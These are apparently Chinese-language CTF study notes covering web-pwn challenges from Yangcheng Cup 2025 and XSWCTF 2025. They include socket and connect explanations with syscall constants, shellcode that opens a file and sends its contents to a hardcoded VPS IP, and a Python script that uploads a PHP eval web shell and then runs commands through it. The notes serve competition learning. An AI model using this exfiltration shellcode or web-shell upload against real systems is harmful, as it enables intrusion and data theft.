---
title: WEB PWN
date: '2025-10-30 18:47:34'
updated: '2025-12-28 14:13:03'
---
## <font style="background-color:rgba(255, 255, 255, 0);">主流 HTTP 服务器的语言</font>
| <font style="background-color:rgba(255, 255, 255, 0);">HTTP 服务器</font> | <font style="background-color:rgba(255, 255, 255, 0);">主要开发语言</font> | <font style="background-color:rgba(255, 255, 255, 0);">说明</font> |
| --- | --- | --- |
| <font style="background-color:rgba(255, 255, 255, 0);">Apache HTTP Server</font> | <font style="background-color:rgba(255, 255, 255, 0);">C</font> | <font style="background-color:rgba(255, 255, 255, 0);">使用 C 语言编写，模块化设计，性能高，可扩展性强。</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">Nginx</font> | <font style="background-color:rgba(255, 255, 255, 0);">C</font> | <font style="background-color:rgba(255, 255, 255, 0);">完全用 C 编写，采用异步事件驱动架构，内存占用低，适合高并发。</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">Microsoft IIS</font> | <font style="background-color:rgba(255, 255, 255, 0);">C/C++</font> | <font style="background-color:rgba(255, 255, 255, 0);">微软开发，底层为 C/C++，深度集成 Windows 内核。</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">Lighttpd</font> | <font style="background-color:rgba(255, 255, 255, 0);">C</font> | <font style="background-color:rgba(255, 255, 255, 0);">轻量级，用 C 编写，专为速度和低资源消耗优化。</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">Caddy</font> | <font style="background-color:rgba(255, 255, 255, 0);">Go (Golang)</font> | <font style="background-color:rgba(255, 255, 255, 0);">现代化 Web 服务器，用 Go 编写，支持自动 HTTPS、跨平台编译。</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">Tomcat</font> | <font style="background-color:rgba(255, 255, 255, 0);">Java</font> | <font style="background-color:rgba(255, 255, 255, 0);">Apache 开源项目，完全用 Java 编写，运行在 JVM 上。</font> |


web pwn 应该就是 pwn 的后端程序，

一般题目给的应该是完整的 docker，这样也方便直接部署来看具体的服务

也可以在 VPS 上面的 docker 部署，这样的话更还原题目环境，

不知道为啥本地的 docker 打不通

## 羊城杯 2025 CandS
第一次做这种Clinet、Server类型的题目，题目的靶机实际上是client端，需要利用靶机的client程序跟server通信，漏洞一般在server端

其中要注意的是因为是靶机和server通信，拿到的flag是没法直接从脚本交互拿到的，需要用shellcode通过反弹flag到vps读取

VPS要执行下面的指令来listen对应端口

```plain
nc -lvp <port>
```

shellcode顺序：

socket（创建套接字） -> connect（连接VPS） -> orw（向套接字发送flag）

```plain
shellcode=asm('''
    push 2
    pop rdi
    push 1
    pop rsi
    xor rdx,rdx
    push 0x29
    pop rax
    syscall
    
    push rax
    pop rdi
    push 0x10
    pop rdx
    mov rbx, 0x{ip_hex}{port_hex}0002
    push rbx
    push rsp
    pop rsi
    push 0x2a
    pop rax
    syscall
    
    push rdi
    pop rbx
    push 0x67616c66
    push rsp
    pop rdi
    push 0
    pop rsi
    push 2
    pop rax
    syscall
    
    push rax
    pop rdi
    push rsp
    pop rsi
    push 0x50
    pop rdx
    push 0
    pop rax
    syscall
    
    push rbx
    pop rdi
    push rsp
    pop rsi
    push 0x50
    pop rdx
    push 1
    pop rax
    syscall
''')
```

```plain
shellcode=asm(shellcraft.socket(2,1,0))
shellcode+=asm(shellcraft.connect(rax,0x{ip_hex}{port_hex}0002,0x10))
shellcode+=asm(shellcraft.open("flag", 0, 0))
shellcode+=asm(shellcraft.read(rax,rsp,0x50))
shellcode+=asm(shellcraft.write(sockfd,rsp,0x50))
```

其中比较麻烦的是connect时候ip和端口的传值：

```plain
ip="8.134.223.173"
port="7788"

def ip_to_hex(ip):
    parts = ip.split('.')
    hex_parts = [hex(int(num))[2:].zfill(2) for num in parts]
    return ''.join(reversed(hex_parts))

def port_to_hex(port):
    port_hex = hex(int(port))[2:].zfill(4)
    port_bytes = [port_hex[i:i+2] for i in range(0, len(port_hex), 2)]
    return ''.join(reversed(port_bytes))
```

实际上是把IP的四个部分给单独hex成四个字节还有端口hex成两个字节，然后以大端序传输

![](/images/e1be97c6e201e809dac372337ac66d80.png)

### socket系统调用
返回值是套接字对应的fd

第一个domain参数（地址族）

```plain
// Linux系统中实际的数值定义
#define AF_UNSPEC       0   // 未指定协议族
#define AF_LOCAL        1   // 本地通信 (Unix域套接字)
#define AF_UNIX         1   // 同AF_LOCAL
#define AF_INET         2   // IPv4协议
#define AF_AX25         3   // Amateur Radio AX.25
#define AF_IPX          4   // IPX - Novell协议
#define AF_APPLETALK    5   // AppleTalk DDP
#define AF_NETROM       6   // Amateur radio NetROM
#define AF_BRIDGE       7   // 多协议桥接
#define AF_ATMPVC       8   // ATM PVCs
#define AF_X25          9   // Reserved for X.25 project
#define AF_INET6        10  // IPv6协议
#define AF_ROSE         11  // Amateur Radio X.25 PLP
#define AF_DECnet       12  // Reserved for DECnet project
#define AF_NETBEUI      13  // Reserved for 802.2LLC project
#define AF_SECURITY     14  // 安全回调伪AF
#define AF_KEY          15  // PF_KEY key management API
#define AF_NETLINK      16  // Netlink接口
#define AF_PACKET       17  // 数据包接口
#define AF_ASH          18  // Ash
#define AF_ECONET       19  // Acorn Econet
#define AF_ATMSVC       20  // ATM SVCs
#define AF_RDS          21  // RDS sockets
#define AF_SNA          22  // Linux SNA Project
#define AF_IRDA         23  // IRDA sockets
#define AF_PPPOX        24  // PPPoX sockets
#define AF_WANPIPE      25  // Wanpipe API Sockets
#define AF_LLC          26  // Linux LLC
#define AF_IB           27  // Native InfiniBand address
#define AF_MPLS         28  // MPLS
#define AF_CAN          29  // Controller Area Network
#define AF_TIPC         30  // TIPC sockets
#define AF_BLUETOOTH    31  // Bluetooth sockets
#define AF_IUCV         32  // IUCV sockets
#define AF_RXRPC        33  // RxRPC sockets
#define AF_ISDN         34  // mISDN sockets
#define AF_PHONET       35  // Phonet sockets
#define AF_IEEE802154   36  // IEEE 802.15.4 sockets
#define AF_CAIF         37  // CAIF sockets
#define AF_ALG          38  // Algorithm sockets
#define AF_NFC          39  // NFC sockets
#define AF_VSOCK        40  // vSockets
#define AF_KCM          41  // Kernel Connection Multiplexor
#define AF_QIPCRTR      42  // Qualcomm IPC Router
#define AF_SMC          43  // smc sockets
#define AF_XDP          44  // XDP sockets
```

第二个type参数（套接字类型）

```plain
// 套接字类型定义
#define SOCK_STREAM     1   // 流式套接字 (TCP)
#define SOCK_DGRAM      2   // 数据报套接字 (UDP)
#define SOCK_RAW        3   // 原始套接字
#define SOCK_RDM        4   // 可靠交付消息
#define SOCK_SEQPACKET  5   // 有序分组套接字
#define SOCK_DCCP       6   // 数据报拥塞控制协议
#define SOCK_PACKET     10  // Linux特定方式获取数据包

// 类型修饰符（可与上述类型按位或）
#define SOCK_CLOEXEC    02000000  // 执行时关闭
#define SOCK_NONBLOCK   04000     // 非阻塞
```

第三个protocol参数（具体协议）

```plain
// 协议号定义
#define IPPROTO_IP      0   // 虚拟协议，表示任何协议
#define IPPROTO_ICMP    1   // ICMP协议
#define IPPROTO_IGMP    2   // IGMP协议
#define IPPROTO_IPIP    4   // IPIP隧道
#define IPPROTO_TCP     6   // TCP协议
#define IPPROTO_EGP     8   // 外部网关协议
#define IPPROTO_PUP     12  // PUP协议
#define IPPROTO_UDP     17  // UDP协议
#define IPPROTO_IDP     22  // XNS IDP协议
#define IPPROTO_TP      29  // SO传输协议类4
#define IPPROTO_DCCP    33  // 数据报拥塞控制协议
#define IPPROTO_IPV6    41  // IPv6-in-IPv4隧道
#define IPPROTO_RSVP    46  // RSVP协议
#define IPPROTO_GRE     47  // GRE协议
#define IPPROTO_ESP     50  // IPSEC ESP
#define IPPROTO_AH      51  // IPSEC AH
#define IPPROTO_MTP     92  // MTP协议
#define IPPROTO_BEETPH  94  // IP选项BEET
#define IPPROTO_ENCAP   98  // 封装头
#define IPPROTO_PIM     103 // PIM协议
#define IPPROTO_COMP    108 // 压缩头
#define IPPROTO_SCTP    132 // SCTP协议
#define IPPROTO_UDPLITE 136 // UDPLite协议
#define IPPROTO_MPLS    137 // MPLS in IP
#define IPPROTO_RAW     255 // 原始IP数据包
```

### connect系统调用
第一个sockfd参数（套接字文件描述符）

第二个addr参数（目标地址结构指针）

指向一个sockaddr结构体，其中结构为：

```plain
#include <netinet/in.h>

struct sockaddr_in {
    sa_family_t    sin_family;   // 地址族: AF_INET
    in_port_t      sin_port;     // 端口号（网络字节序）
    struct in_addr sin_addr;     // IP地址（网络字节序）
    unsigned char  sin_zero[8];  // 填充字段（全0）
};

struct in_addr {
    in_addr_t s_addr;  // 32位IPv4地址
};
```

所以上面的0x{ip_hex}{port_hex}0002对应的就是这个结构体的值

第三个参数是addrlen参数（地址结构长度）

IPv4结构体的长度是0x10

> 在connect之后就可以通过socket创建的fd跟连接的服务器通信了
>

## 羊城杯 2025 hello_iot
这题用的是 microhttpd（MHD），是一个轻量级的 C 语言库，

用于在应用程序中嵌入 HTTP 服务器功能

main 函数里面的 MHD_start_daemon 参数的`sub_4031D5`就是每次访问时候调用的函数

![](/images/fa5655216fa162ce99e6eae5fa051ab0.png)

也是路由函数：

![](/images/dd1c0f8a0ea85252c6111c88babb78ee.png)

一开始是只有 login.html 可以访问，要鉴权才可以继续别的操作：

![](/images/822d3b6dcdde406dd5860ad525c78f59.png)

里面要填的东西可以通过 html 源代码看见传递到后端的变量名：

这个登录 token 的变量名是 ciphertext

![](/images/135b366eb1a4b3d74d8f19dbcb40d081.png)

就可以在 IDA 里面看看是怎么比较的了：

## XSWCTF 2025 是web劈了腿还是pwn出了轨
```python
#!/usr/bin/env python3
import requests

url="http://113.46.235.74:8035/cacti/cgi-bin/upgrade.cgi"

# filename='./shell.zip'

files={
    "%26736c%7$hn":("pwn",b'<?php @eval($_POST[\'attack\']);?>','multipart/form-data')
}

r=requests.post(url,files=files)
print(r.text)

url1="http://113.46.235.74:8035/cacti/uploads/upgrade_file.php"

r=requests.post(url1,data={"attack":"system('cat /flag.txt');"})
print(r.text)
```

